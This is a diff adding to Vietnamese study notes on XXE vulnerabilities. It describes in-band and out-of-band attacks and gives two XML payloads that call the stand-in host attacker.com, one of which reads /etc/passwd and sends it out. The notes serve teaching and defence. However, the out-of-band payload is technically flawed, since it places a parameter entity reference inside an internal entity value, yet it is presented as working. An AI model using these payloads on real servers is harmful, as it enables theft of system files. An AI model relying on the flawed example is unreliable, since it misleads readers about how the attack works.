@@ -64,10 +64,33 @@ Lỗ hổng XXE (XML External Entity) phát sinh khi ứng dụng không xử l�
   Có 2 loại tấn công phổ biến:
   
   - Exploiting External Entity Declaration (In-band XXE)
+
+Đây là loại tấn công XXE phổ biến nhất. Trong tấn công này, kẻ tấn công chèn một thực thể ngoại vi độc hại trực tiếp vào tài liệu XML. Thực thể ngoại vi này sẽ truy cập và đọc các tệp tin hoặc tài nguyên từ xa. Kết quả của việc đọc này sau đó có thể được trả về trong phản hồi từ máy chủ.
+
+```
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "http://attacker.com/malicious-file">
+]>
+<data>&xxe;</data>
+```
+
+Trong ví dụ trên, kẻ tấn công chèn một thực thể ngoại vi xxe và truy cập tệp tin `malicious-file` từ xa thông qua URL `http://attacker.com/malicious-file`. Dữ liệu từ tệp tin này sẽ được đưa vào tài liệu XML và trả về trong phản hồi.
   
   - Exploiting Parameter Entities (Out-of-band XXE)
   
-  Ngoài ra còn có:
+Loại tấn công này sử dụng các thực thể tham số (parameter entities) để khai thác XXE. Kẻ tấn công chèn một thực thể ngoại vi độc hại vào tài liệu XML, nhưng việc truy cập đến tệp tin hoặc tài nguyên từ xa không xảy ra trong quá trình phân tích cú pháp. Thay vào đó, dữ liệu được truyền qua kênh phụ, như gửi thông qua giao thức HTTP hoặc DNS.
+ 
+```
+  <!DOCTYPE data [
+  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY callhome SYSTEM "http://attacker.com/?data=%xxe;">
+]>
+<data>&callhome;</data>
+```
+
+Trong ví dụ trên, kẻ tấn công chèn một thực thể tham số `%xxe` để tham chiếu đến tệp tin `/etc/passwd`. Sau đó, dữ liệu từ tệp tin này được gửi đến máy chủ của kẻ tấn công thông qua URL `http://attacker.com/?data=%xxe;`.
+  
+Ngoài ra còn có:
   
   - Exploiting XXE to retrieve files, trong đó một thực thể ngoại vi được định nghĩa chứa nội dung của một tệp tin, và được trả về trong phản hồi của ứng dụng.
   
